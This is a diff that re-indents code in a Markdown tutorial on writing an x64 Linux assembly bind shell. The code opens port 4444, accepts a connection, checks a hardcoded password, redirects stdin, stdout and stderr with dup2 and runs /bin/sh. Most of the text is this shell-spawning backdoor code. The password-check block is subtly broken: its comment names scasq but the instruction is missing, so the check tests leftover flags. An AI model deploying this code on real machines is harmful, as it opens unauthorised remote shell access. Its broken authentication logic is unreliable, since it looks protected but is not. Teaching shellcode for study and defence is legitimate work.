@@ -31,37 +31,37 @@ In this case, address family `AF_INET` uses IPv4 protocol implementation. And si
 
 Assembly code:
 ``` Assembly x64
-global _start
-
-section .text
-
-_start:
-	; Socket syscall
-		; Calling 'socket' syscall by assigning its decimal number into rax.
-		; Then pushing arguments one by one
-		; rdi = AF_INET
-		; rsi = SOCK_STREAM
-		; rdx = 0, because of rsi.
-
-		push 41
-		pop rax 
-
-		; 'domain' argument: AF_INET = 2
-		push -2
-		pop rdi
-		neg rdi
-
-		; 'type' argument: SOCK_STREAM = 1
-		push rdi
-		pop rsi
-		dec rsi
-
-		; 'protocol' argument = 0
-		xor edx, edx
-
-		; After a 'socket' syscall is closed, a file descriptor 
-		; (later is refered to as 'fd') is saved in 'rax' register
-		syscall
+	global _start
+	
+	section .text
+	
+	_start:
+		; Socket syscall
+			; Calling 'socket' syscall by assigning its decimal number into rax.
+			; Then pushing arguments one by one
+			; rdi = AF_INET
+			; rsi = SOCK_STREAM
+			; rdx = 0, because of rsi.
+	
+			push 41
+			pop rax 
+	
+			; 'domain' argument: AF_INET = 2
+			push -2
+			pop rdi
+			neg rdi
+	
+			; 'type' argument: SOCK_STREAM = 1
+			push rdi
+			pop rsi
+			dec rsi
+	
+			; 'protocol' argument = 0
+			xor edx, edx
+	
+			; After a 'socket' syscall is closed, a file descriptor 
+			; (later is refered to as 'fd') is saved in 'rax' register
+			syscall
 ```
 
 ### Binding a socket to a local machine port
@@ -93,39 +93,39 @@ Its purpose is to cast the structure pointer passed in `addr` to avoid compiler 
 
 Assembly code:
 ```Assembly x64
-; Bind syscall
-	; The number of 'bind' syscall equals to 49 in decimal
-	; Before assigning anything to rax, save its value to rdi
-	; rdi = fd stored in rax
-	; rsi = sockaddr_in
-	; rdx = length of rsi
-
-	; store fd in rdi
-	push rax
-	pop rdi
-
-	; calling 'bind' syscall
-	push 49
-	pop rax
-
-	; pushing addrlen to rdx
-	push 16
-	pop rdx
-
-	; Now we are creating a stack
-	; first - push rdx 2 times to get 00 in between 0x5c11 and 02
-	%rep 2
-	push rdx
-	%endrep
-
-	; this is a struct of addr
-	mov word [rsp+2], 0x5c11 ; stands for port number in hex
-	mov byte [rsp], 0x2
-
-	;saving the addr in rsi
-	mov rsi, rsp 
-
-	syscall
+	; Bind syscall
+		; The number of 'bind' syscall equals to 49 in decimal
+		; Before assigning anything to rax, save its value to rdi
+		; rdi = fd stored in rax
+		; rsi = sockaddr_in
+		; rdx = length of rsi
+	
+		; store fd in rdi
+		push rax
+		pop rdi
+	
+		; calling 'bind' syscall
+		push 49
+		pop rax
+	
+		; pushing addrlen to rdx
+		push 16
+		pop rdx
+	
+		; Now we are creating a stack
+		; first - push rdx 2 times to get 00 in between 0x5c11 and 02
+		%rep 2
+		push rdx
+		%endrep
+	
+		; this is a struct of addr
+		mov word [rsp+2], 0x5c11 ; stands for port number in hex
+		mov byte [rsp], 0x2
+	
+		;saving the addr in rsi
+		mov rsi, rsp 
+	
+		syscall
 ```
 
 Stack is a not intuitive weird thing. It grows to the bottom. We use stack here to create a struct for `addr` and save the value of stack pointer (SP) into `rsi` register. 
@@ -149,16 +149,16 @@ int listen(int sockfd, int backlog);
 2. `backlog` defines the max length for the queue of socket pending connections.
 
 ```Assembly x64
-; Listen syscall
-
-	push 50 
-	pop rax ; 'listen' syscall number
-
-	; fd is already stored in rdi
-
-	push 1
-	pop rsi ; backlog
-	syscall
+	; Listen syscall
+	
+		push 50 
+		pop rax ; 'listen' syscall number
+	
+		; fd is already stored in rdi
+	
+		push 1
+		pop rsi ; backlog
+		syscall
 ```
 
 
@@ -178,22 +178,22 @@ int accept (int sockfd, struct sockaddr *addr, socklen_t *addrlen);
 3. `addrlen` - value-result argument that contains the size of the struct pointed to by `addr` (in bytes).
 
 ```Assembly x64
-; Accept syscall
-
-	push 43
-	pop rax ; 43 is a decimal for 'accept' syscall
-
-	cdq ; zeroing rdx -- converting to a quadword
-	push rdx
-	push rdx ; the same stack logic as in 'bind' syscall
-
-	mov rsi, rsp ; client will be stored in rsi 
-	push 16 ; size of 'addr'
-	lea rdx, [rsp]
-	syscall
-
-	; store a client socket descriptor in r9 for later use
-	xchg r9, rax
+	; Accept syscall
+	
+		push 43
+		pop rax ; 43 is a decimal for 'accept' syscall
+	
+		cdq ; zeroing rdx -- converting to a quadword
+		push rdx
+		push rdx ; the same stack logic as in 'bind' syscall
+	
+		mov rsi, rsp ; client will be stored in rsi 
+		push 16 ; size of 'addr'
+		lea rdx, [rsp]
+		syscall
+	
+		; store a client socket descriptor in r9 for later use
+		xchg r9, rax
 ```
 
 ### Close a file descriptor
@@ -205,32 +205,34 @@ int close(int fd);
 ```
 
 ```Assembly x64
-closefd_syscall:
+	closefd_syscall:
+		
+		push 3
+		pop rax
+		
+		; it takes fd as an rdi argument
+		; here fd is already in rdi
+		
+		syscall
 	
-	push 3
-	pop rax
+	; restoring client socket descriptor to rdi
 	
-	; it takes fd as an rdi argument
-	; here fd is already in rdi
+		mov rdi, r9
 	
-	syscall
-
-; restoring client socket descriptor to rdi
-
-	mov rdi, r9
-
-; jumping to a read_syscall on success
-; this will be another point of return
-
-	jz read_syscall
+	; jumping to a read_syscall on success
+	; this will be another point of return
 	
-; or exit on error
-	push 60
-	pop rax
-	syscall
+		jz read_syscall
+		
+	; or exit on error
+		push 60
+		pop rax
+		syscall
 ```
 
+
 The `closefd_syscall:` is not a comment, but a point to which the program can return (note: the program returns to the point in the code, not in memory).
+
 
 ### Read from a fd
 
@@ -241,21 +243,21 @@ ssize_t read(int fd, void *buf, size_t count);
 ```
 
 ```Assembly x64
-read_syscall:
-
-	xor rax, rax
+	read_syscall:
 	
-	; rdi client already stored in rdi
-	
-	; taking user input
-	sub rsp, 24
-	mov rsi, rsp
-	
-	push 24
-	pop rdx
-	
-	; user input is stored in rsi
-	syscall
+		xor rax, rax
+		
+		; rdi client already stored in rdi
+		
+		; taking user input
+		sub rsp, 24
+		mov rsi, rsp
+		
+		push 24
+		pop rdx
+		
+		; user input is stored in rsi
+		syscall
 ```
 
 
@@ -265,16 +267,16 @@ Here we just add some authentication not in the most reliable way, but just to s
 Do not forget to hexify your password.
 
 ```Assembly x64
-; Compare password
-
-	; 'urmom\n' = 0x75726D6F6D5C6E
+	; Compare password
 	
-	mov rax, 0x75726D6F6D5C6E
-	lea rdi, [rsi]
-	
-	; scasq - instruction that compares 
-	mov rdi, r9
-	jne closefd_syscall ; if does not match (error in scasq), then close socket	
+		; 'urmom\n' = 0x75726D6F6D5C6E
+		
+		mov rax, 0x75726D6F6D5C6E
+		lea rdi, [rsi]
+		
+		; scasq - instruction that compares 
+		mov rdi, r9
+		jne closefd_syscall ; if does not match (error in scasq), then close socket	
 ```
 
 
@@ -289,27 +291,27 @@ int dup2(int oldfd, int newfd);
 
 Assembly code:
 ```Assembly x64
-; Duplicate2 syscall
-
-	; rdi client socket
-	; rsi must iterate 3 times
-
-	; loop counter
-	push 3
-	pop rcx
-
-	; fd counter
-	push 2
-	pop rbx
-
-	dup2:
-		push 33
-		pop rax
-		mov rsi, rbx ; decrementing fd counter
-		push rcx ; store loop counter
-		syscall
-		pop rcx ; restore loop
-		loop dup2
+	; Duplicate2 syscall
+	
+		; rdi client socket
+		; rsi must iterate 3 times
+	
+		; loop counter
+		push 3
+		pop rcx
+	
+		; fd counter
+		push 2
+		pop rbx
+	
+		dup2:
+			push 33
+			pop rax
+			mov rsi, rbx ; decrementing fd counter
+			push rcx ; store loop counter
+			syscall
+			pop rcx ; restore loop
+			loop dup2
 ```
 
 ### Execute a /bin/sh shell
@@ -325,19 +327,19 @@ int execve(const char *pathname, char *const _Nullable argv[], char *const _Null
 ```
 
 ```Assembly x64
-; Execve syscall
-
-	mov rax, 59
-	lea rdi, [rel binsh]
-	xor rsi, rsi
-	push rsi
-	pop rdx
-	syscall
+	; Execve syscall
+	
+		mov rax, 59
+		lea rdi, [rel binsh]
+		xor rsi, rsi
+		push rsi
+		pop rdx
+		syscall
 ```
 
 What's a `binsh`? This is a variable that contains a string "/bin/sh". To initialize it, section .data must be implemented:
 
-```Assembly x64
+```
 section .data
 	binsh db "/bin/sh"
 ```
